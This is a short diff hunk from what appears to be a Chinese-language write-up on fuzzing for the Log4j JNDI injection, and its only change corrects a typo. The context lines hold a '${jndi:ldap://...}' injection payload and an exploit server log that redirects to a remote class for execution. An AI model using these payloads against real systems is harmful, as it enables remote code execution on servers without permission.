@@ -37,7 +37,7 @@ ldap://10.10.10.10:1389/m5m8wo
 最后fuzz ${jndi:ldap://10.10.10.10:1389}
 ![](img/2.png)
 
-效果是jdni上收到请求消息
+效果是jndi上收到请求消息
 `Send LDAP reference result for dd redirecting to http://10.10.10.10:9092/ExecTemplateJDK7.class`
 
 
